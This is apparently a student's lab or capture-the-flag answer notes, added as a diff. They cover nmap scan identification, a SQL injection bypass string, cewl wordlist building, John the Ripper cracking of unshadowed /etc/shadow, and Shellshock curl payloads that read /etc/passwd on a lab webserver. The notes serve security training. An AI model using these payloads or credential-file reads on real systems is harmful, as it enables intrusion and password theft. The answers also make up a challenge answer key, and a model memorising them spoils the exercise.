@@ -1,0 +1,63 @@
+1) 
+a. 49961 packets in capture
+b. 15 class A IP addresses
+c. 47021 packets using TCP protocols
+d. 69.4.231.52 sent the most packets
+
+2)
+a. 10.10.35.24 is performing an nmap stealth scan (nc -sS), sends SYN, and recieves SYN/ACK, but doesn't send ACK
+b. 10.10.20.10 is performing an nmap null scan (nc -sN) all TCP bits set to 0
+c. 10.10.50.61 is performing an nmap xmas scan (nc -sX) all TCP bits set to 1
+d. 10.10.20.34 is performing a fin scan (nc -sF), all TCP bits set to 0 execpt FIN (set to 1)
+
+3)
+a. 10.0.0.129 is sweeping the network (nc -sp 10.0.0.1-255)
+b. on 10.0.0.152 ports 21, 922, 1028 are open, 3 total
+c. 129.168.1.15 nmap -sV -sC <target> checks to see if an FTP server allows port scanning using the FTP bounce method, 192.168.1.15 is performing ftp bounce scan (need to look this up separately)
+d. 192.168.1.20 is performing a UDP scan (nc -sU)
+
+4) url was https://ctf.aiseclabs.com/cwa
+
+5) url was https://ctf.aiseclabs.com/0777
+
+6) SQL injection exercise, need to connect to the website and navigate to phone directory lookup page
+(for hacking in other circumstances, map out all website endpoints, try entering blank space/random passwords in forms and see what happens)
+-Blind sql injection: first command you know will be false, then command you know will be true (tells you if inputs are scrubed)
+-look at web source to see what inputs are, and if get or post request
+-determine likely method request based on file extension (Ex. _GET for .php)
+-correct input was ' OR 1 OR username = ' (could also have been " OR 1 OR username = " for PHP) this prints out contents of directory -> copy this to text file and search using grep (grep -c Name directory.txt) (56 matches)
+
+7) Grep directory.txt for phone #
+
+8)
+a. IP addr = 192.168.30.108
+b. Laptop name is ann-laptop
+c. MAC address of router that gives access to wider internet is d0:d0:fd:c4:09:94
+d. IP of dns is 10.30.30.20
+e. There are 7 ip addresses in the network and one is the broadcast address so 6 devices
+f. Mail servers are 64.12.168.40 (smtp) and 205.188.58.10 (imap, this was the correct answer)
+
+9) cewl http://10.99.0.51 -w wordlist.txt
+  wc -l wordlist.txt (word count)
+  1751 words in wordlis
+
+10) Use wordlist for dictionary attack, john the ripper
+john --test (benchmark + determine capabilities)
+sudo unshadow /etc/passwd /etc/shadow > mypassword.txt
+john mypassword.txt --wordlist=wordlist.txt
+
+11) Exploit shellshock/bashdoor bash vulnerability on the webserver -> when an service provider on the internet (such as a webserver uses bash to processes certain requests, can cause vulnerable versions of bash to execute arbitrary commands by giving users access to higher privilege shell through "function export" feature where command scripts created in one bash can be shared in subordinate instances by encoding scripts in table shared between instances the environment variable list)
+tryden is in the virtualbox user list
+curl -A "() { :;};echo; /bin/cat/ /etc/passwd" http://10.99.0.51/cgi-bin/netstat.cgi > passwd
+(find correct endpoint with nikto -host http://10.99.0.51)
+curl -A "() { :;};echo; /usr/bin/id" http://10.99.0.51/cgi-bin/netstat.cgi to find id (it's www-data)
+
+******
+
+1) 192.168.1.66
+
+2) 192.168.1.70
+
+3) www.wayfair.com
+
+4) 
